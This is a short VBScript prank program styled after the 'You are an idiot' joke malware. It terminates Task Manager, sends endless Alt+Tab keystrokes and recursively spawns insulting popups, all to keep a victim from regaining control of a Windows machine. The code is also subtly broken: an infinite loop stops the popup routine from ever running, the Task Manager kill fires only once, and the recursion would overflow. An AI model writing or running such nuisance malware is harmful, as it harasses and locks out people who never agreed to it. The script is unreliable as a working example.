Set WshShell = CreateObject("WScript.Shell")

' Function to block Task Manager
Sub BlockTaskManager()
    On Error Resume Next
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
    For Each objItem In colItems
        objItem.Terminate
    Next
End Sub

' Function to block Alt + F4 key
Sub BlockAltF4()
    Do
        WshShell.SendKeys "%{TAB}" ' Simulate Alt+Tab to prevent Alt+F4
        WScript.Sleep 1000 ' Wait for 1 second before repeating
    Loop
End Sub

' Function to show the popup and make it multiply
Sub ShowPopup()
    Set objPopup = CreateObject("WScript.Shell")
    
    Do
        objPopup.Popup "You are an idiot!", 2, "Prank Time!", 64 ' Show the popup message
        WScript.Sleep 1000 ' Wait for 1 second before opening the next one
        
        ' Make the popup "bounce" around the screen
        For i = 1 To 10
            WshShell.SendKeys "{LEFT}"
            WshShell.SendKeys "{RIGHT}"
        Next

        ShowPopup ' Call the function again to multiply the popups
    Loop
End Sub

' Start blocking Task Manager and Alt + F4
Call BlockTaskManager
Call BlockAltF4
Call ShowPopup
